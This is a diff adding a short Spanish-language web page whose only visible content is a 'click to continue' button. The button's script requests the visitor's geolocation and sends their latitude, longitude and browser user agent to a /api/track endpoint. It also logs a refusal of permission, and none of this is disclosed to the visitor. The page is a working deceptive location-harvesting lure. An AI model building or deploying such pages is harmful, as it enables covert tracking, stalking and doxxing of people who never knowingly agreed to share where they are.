@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>Haz clic para continuar</h2>
+<button onclick="start()">Continuar</button>
+
+<script>
+async function sendData(data) {
+  await fetch("/api/track", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(data)
+  });
+}
+
+function start() {
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      await sendData({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        userAgent: navigator.userAgent
+      });
+
+      document.body.innerHTML = "Listo ✅";
+    },
+    async () => {
+      await sendData({ error: "No dio permisos" });
+    }
+  );
+}
+</script>
+
+</body>
+</html>
